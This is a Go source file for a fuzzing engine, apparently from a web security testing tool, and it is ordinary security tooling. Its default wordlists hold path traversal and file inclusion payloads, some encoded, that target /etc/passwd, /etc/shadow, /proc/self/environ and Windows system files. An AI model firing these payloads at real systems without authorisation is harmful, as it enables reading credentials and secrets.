package fuzzing

import (
	"sync"
	"time"
)

// FuzzResult represents a fuzzing result
type FuzzResult struct {
	Payload     string
	StatusCode  int
	Length      int
	Interesting bool
	Response    string
	RetryCount  int
}

// FuzzingEngine handles fuzzing operations
type FuzzingEngine struct {
	wordlist        []string
	threads         int
	rateLimit       int // requests per second
	delay           time.Duration
	headers         map[string]string
	followRedirects bool
	results         chan *FuzzResult
	stopped         bool
	mu              sync.Mutex
	retryCount      int
	retryDelay      time.Duration
	timeout         time.Duration
}

// NewFuzzingEngine creates a new fuzzing engine
func NewFuzzingEngine() *FuzzingEngine {
	return &FuzzingEngine{
		threads:    10,
		rateLimit:  0, // no limit by default
		delay:      0,
		headers:    make(map[string]string),
		results:    make(chan *FuzzResult, 100),
		stopped:    false,
		retryCount: 0,
		retryDelay: 1 * time.Second,
		timeout:    30 * time.Second,
	}
}

// SetThreads sets the number of concurrent threads
func (fe *FuzzingEngine) SetThreads(threads int) {
	fe.mu.Lock()
	defer fe.mu.Unlock()
	fe.threads = threads
}

// SetRateLimit sets the rate limit (requests per second)
func (fe *FuzzingEngine) SetRateLimit(rate int) {
	fe.mu.Lock()
	defer fe.mu.Unlock()
	fe.rateLimit = rate
}

// SetDelay sets the delay between requests
func (fe *FuzzingEngine) SetDelay(delay time.Duration) {
	fe.mu.Lock()
	defer fe.mu.Unlock()
	fe.delay = delay
}

// SetRetryConfig sets retry configuration
func (fe *FuzzingEngine) SetRetryConfig(count int, delay time.Duration) {
	fe.mu.Lock()
	defer fe.mu.Unlock()
	fe.retryCount = count
	fe.retryDelay = delay
}

// SetTimeout sets request timeout
func (fe *FuzzingEngine) SetTimeout(timeout time.Duration) {
	fe.mu.Lock()
	defer fe.mu.Unlock()
	fe.timeout = timeout
}

// SetHeaders sets custom headers
func (fe *FuzzingEngine) SetHeaders(headers map[string]string) {
	fe.mu.Lock()
	defer fe.mu.Unlock()
	fe.headers = headers
}

// LoadWordlist loads a wordlist from slice
func (fe *FuzzingEngine) LoadWordlist(wordlist []string) {
	fe.mu.Lock()
	defer fe.mu.Unlock()
	fe.wordlist = wordlist
}

// FuzzFunc defines the function to fuzz
type FuzzFunc func(payload string) (*FuzzResult, error)

// Start starts fuzzing
func (fe *FuzzingEngine) Start(targetURL, param string, fuzzFunc FuzzFunc) {
	fe.mu.Lock()
	fe.stopped = false
	fe.mu.Unlock()

	var wg sync.WaitGroup
	payloadChan := make(chan string, fe.threads)

	// Start workers
	for i := 0; i < fe.threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range payloadChan {
				if fe.isStopped() {
					break
				}

				// Apply rate limiting
				if fe.rateLimit > 0 {
					fe.applyRateLimit()
				}

				// Apply delay
				if fe.delay > 0 {
					time.Sleep(fe.delay)
				}

				// Execute fuzz
				result, err := fuzzFunc(payload)
				if err == nil {
					fe.results <- result
				}
			}
		}()
	}

	// Send payloads
	go func() {
		for _, payload := range fe.wordlist {
			if fe.isStopped() {
				break
			}
			payloadChan <- payload
		}
		close(payloadChan)
	}()

	// Wait for completion
	go func() {
		wg.Wait()
		close(fe.results)
	}()
}

// Stop stops fuzzing
func (fe *FuzzingEngine) Stop() {
	fe.mu.Lock()
	defer fe.mu.Unlock()
	fe.stopped = true
}

func (fe *FuzzingEngine) isStopped() bool {
	fe.mu.Lock()
	defer fe.mu.Unlock()
	return fe.stopped
}

// GetResults returns the results channel
func (fe *FuzzingEngine) GetResults() chan *FuzzResult {
	return fe.results
}

func (fe *FuzzingEngine) applyRateLimit() {
	// Simple rate limiting implementation
	time.Sleep(time.Second / time.Duration(fe.rateLimit))
}

// DefaultTraversalWordlist returns default traversal wordlist
func DefaultTraversalWordlist() []string {
	return []string{
		"../",
		"../../",
		"../../../",
		"../../../../",
		"../../../../../",
		"....//",
		"....//....//",
		"....//....//....//",
		"..\\",
		"..\\..\\",
		"..\\..\\..\\",
		"..\\..\\..\\..\\",
		"..\\..\\..\\..\\..\\",
		"%2e%2e%2f",
		"%2e%2e%2f%2e%2e%2f",
		"%252e%252e%252f",
		"%c0%af..%c0%af",
		"%c0%af..%c0%af..%c0%af",
		"..%252f",
		"..%5c",
		"..%c0%af",
	}
}

// DefaultLFIWordlist returns default LFI wordlist
func DefaultLFIWordlist() []string {
	wordlist := []string{
		// Linux
		"../../../etc/passwd",
		"../../etc/passwd",
		"../etc/passwd",
		"/etc/passwd",
		"../../../etc/shadow",
		"../../etc/shadow",
		"../etc/shadow",
		"/etc/shadow",
		"../../../etc/hosts",
		"../../etc/hosts",
		"../etc/hosts",
		"/etc/hosts",
		// Windows
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"..\\..\\..\\windows\\win.ini",
		"..\\..\\..\\windows\\win.ini",
		"..\\..\\..\\boot.ini",
		"C:\\boot.ini",
		"C:\\windows\\system32\\drivers\\etc\\hosts",
		// Procfs
		"../../../proc/self/environ",
		"../../proc/self/environ",
		"../proc/self/environ",
		"/proc/self/environ",
		"../../../proc/version",
		"../../proc/version",
		"../proc/version",
		"/proc/version",
		"../../../proc/cmdline",
		"../../proc/cmdline",
		"../proc/cmdline",
		"/proc/cmdline",
	}

	// Add encoded versions
	encoded := []string{
		"..%2f..%2f..%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
		"%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
	}

	wordlist = append(wordlist, encoded...)
	return wordlist
}
